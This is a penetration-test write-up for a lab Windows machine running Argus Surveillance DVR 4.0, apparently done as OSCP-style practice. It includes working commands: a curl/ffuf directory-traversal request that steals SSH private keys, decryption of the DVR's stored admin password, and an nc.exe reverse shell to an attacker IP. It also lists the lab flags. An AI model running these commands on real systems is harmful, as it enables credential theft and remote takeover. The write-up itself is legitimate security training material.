# System Information
IP: 192.168.192.179
OS: Windows

---
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [ ] 8080
- [ ] 7680
- [ ] 445
- [ ] 135
- [ ] 139
- [ ] 5040
- [ ] 22
- [ ] 49664
- [ ] 49665
- [ ] 49666
- [ ] 49667
- [ ] 49668
- [ ] 49669

# Service Enumeration
## 8080
Many directories found on feroxbuster
http://dvr4:8080/about.html

Argus Surveillance DVR version 4.0, released 18/12/2008
![[Pasted image 20251109140723.png]]

http://www.argussurveillance.com/

Find a few CVEs for this version... very nice...

![[Pasted image 20251109140900.png]]

CVE 2018-15745 for this version gives directory traversal
https://www.exploit-db.com/exploits/45296

We can simply use curl as shown in the POC, or use a more robust script which uses the same vector:
https://github.com/Jasurbek-Masimov/CVE-2018-15745


C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
```
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked
```
I saw this path mentioned in one of the POC code comments and online, but it didn't reveal much.

C:\Windows\system32\drivers\etc\hosts
(Default)

Apparently according to the hint, the user "viewer" has an SSH key in "the usual location"...

I guess we could have brute forced like

`ffuf -u "http://192.168.192.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FFUZZ%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fr 'Cannot find this file'`

Sure enough... that's the try harder mindset I suppose.
![[Pasted image 20251109153032.png]]


# Initial Access
`curl "http://192.168.192.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" -o id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa viewer@dvr4`

# Privilege Escalation
https://www.exploit-db.com/exploits/45312
According to this PoC, we can place a malicious DLL named "gsm_codec.dll" in the Argus application directory and start the application to achieve privilege escalation.

Unfortunately we don't have write access to `C:\Program Files\Argus Surveillance DVR`!

Still, we can try using https://www.exploit-db.com/exploits/50130

Now with local access, we can read the entire contents of DVRParams.ini.

C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
![[Pasted image 20251109155439.png]]

We have an administrator password hash to try with the Python POC.
7357F64190839083C1658998CA79418DECB4B4A1F539

![[Pasted image 20251109155613.png]]

We have the Administrator user's password as "Password123"!

I tried logging in by SSH but was unable.

Instead, copy RunasCs.exe to the target via SCP and execute to run commands as the administrator user.

https://github.com/antonioCoco/RunasCs

Still, this password fails... at this point I checked the writeup, and the Password hash was different. ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8. This isn't in the config file in my instance, even after resetting, but this seems to be the intended path... after resetting machine, I had the same hash shown in the writeup!

![[Pasted image 20251109162327.png]]


Now from the POC, we get:
![[Pasted image 20251109162348.png]]

14WatchD0g(unknown)

With more research, I eventually found an improved version of the script which bothers to decrypt special characters as well.
https://vulmon.com/vulnerabilitydetails?qid=CVE-2022-25012
https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py

![[Pasted image 20251109163420.png]]

Success!

Now spawn an elevated shell, conveniently using nc.exe on viewer's desktop

`runas /user:Administrator ".\nc.exe 192.168.45.246 4444 -e cmd.exe"`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

local.txt: 7a4c2f3a567e801dfccdc3212ca36a01
proof.txt 864b5a03a37bacee553ac36941ae3e9d

![[Pasted image 20251109165039.png]]

